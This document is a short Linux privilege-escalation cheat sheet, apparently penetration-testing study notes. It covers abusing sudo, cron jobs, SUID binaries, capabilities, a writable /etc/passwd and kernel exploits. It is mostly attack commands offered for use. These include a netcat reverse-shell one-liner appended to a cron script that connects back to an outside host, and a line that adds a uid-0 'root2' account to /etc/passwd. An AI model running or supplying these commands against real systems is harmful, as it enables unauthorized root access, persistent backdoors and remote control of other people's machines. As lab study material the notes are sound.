## su, sudo
becoming root user (need credential)
```
su - root
```

with sudo
```
sudo -i
```

### Abusing Cronjob

inspecting the cron job
```
grep "CRON" /var/log/syslog
```

if all users have w permission on scripts, insert a reverse shell
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 1234 >/tmp/f" >> SCRIPT_FILE
```

## Abusing Password Authentication
check world-writable permission
```
ls -lah /etc/passwd
```

create password hash
```
openssl passwd w00t
```

echo
```
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
```

login user as root2
```
su root2
```

## Abusing Setuid Binaries and Capabilities
find SUID program
```
find / -perm -u=s -type f 2>/dev/null
```

enumerating capabilities
```
/usr/sbin/getcap -r / 2>/dev/null
```

check the GTFOBins
```
https://gtfobins.github.io/
```

## Abusing Sudo
inspecting sudo permisiions
```
sudo -l
```

example
```
joe@debian-privesc:~$ sudo -l
[sudo] password for joe: 
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

crontab, tcpdump, apt-get utilities are llisted

tcpdump is blocked by apparmor

check the GTFOBins
```
https://gtfobins.github.io/
```

## Exploiting Kernel Vulnerabilities
information on the system
```
cat /etc/issue
uname -r
arch
```

searchsploit
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```